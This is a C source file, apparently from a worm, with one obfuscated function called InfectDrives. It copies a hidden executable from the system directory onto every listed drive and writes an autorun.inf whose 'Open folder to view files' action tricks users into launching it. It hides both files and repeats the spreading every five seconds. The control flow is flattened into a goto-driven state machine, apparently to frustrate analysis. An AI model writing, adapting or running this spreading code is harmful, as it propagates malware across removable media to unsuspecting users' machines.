#include "data_globals.h"
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
void InfectDrives(void)
{
    char IFile[256], NewFile[256], Autorun[256], InfFile[256];
    int i;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    GetSystemDirectoryA(IFile, sizeof(IFile));
    strcat(IFile, "\\updater.exe");
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    i = 0;
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    if (Inf_Drives[i] != NULL) {
        dummy_state = 4;
        goto dummy_dispatcher;
    } else {
        dummy_state = 6;
        goto dummy_dispatcher;
    }

dummy_state_4:
    memset(NewFile, 0, sizeof(NewFile));
    memset(Autorun, 0, sizeof(Autorun));
    memset(InfFile, 0, sizeof(InfFile));

    strcpy(NewFile, Inf_Drives[i]);
    strcpy(Autorun, Inf_Drives[i]);

    strcat(NewFile, "\\autoprompt.exe");
    strcat(Autorun, "\\autorun.inf");

    if (CopyFileA(IFile, NewFile, FALSE)) {
        FILE *runfile = fopen(Autorun, "wb");
        if (runfile) {
            sprintf(InfFile,
                    "[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n");
            fputs(InfFile, runfile);
            fclose(runfile);
        }
        SetFileAttributesA(NewFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
        SetFileAttributesA(Autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
    }
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    i++;
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_6:
    Sleep(5000);
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
